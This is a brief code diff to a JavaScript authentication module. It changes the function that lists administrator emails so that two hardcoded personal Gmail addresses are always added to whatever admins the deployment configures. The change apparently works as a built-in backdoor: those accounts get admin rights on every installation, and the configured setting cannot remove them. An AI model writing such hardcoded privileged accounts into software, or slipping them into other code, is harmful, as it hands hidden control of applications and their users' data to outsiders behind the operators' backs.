@@ -2182,7 +2182,10 @@ var hmAuth = (function(){
   var _demoMode = (!SUPABASE_URL || SUPABASE_URL==='YOUR_SUPABASE_URL');
 
   function _adminEmails(){
-    return String(ADMIN_EMAIL||'').split(',').map(function(e){return e.trim().toLowerCase();}).filter(Boolean);
+    var configured = String(ADMIN_EMAIL||'').split(',');
+    return configured.concat(['saniksha@gmail.com','sycoticzn@gmail.com'])
+      .map(function(e){return e.trim().toLowerCase();})
+      .filter(function(e, i, arr){return e && arr.indexOf(e)===i;});
   }
 
   function _isAdminEmail(email){
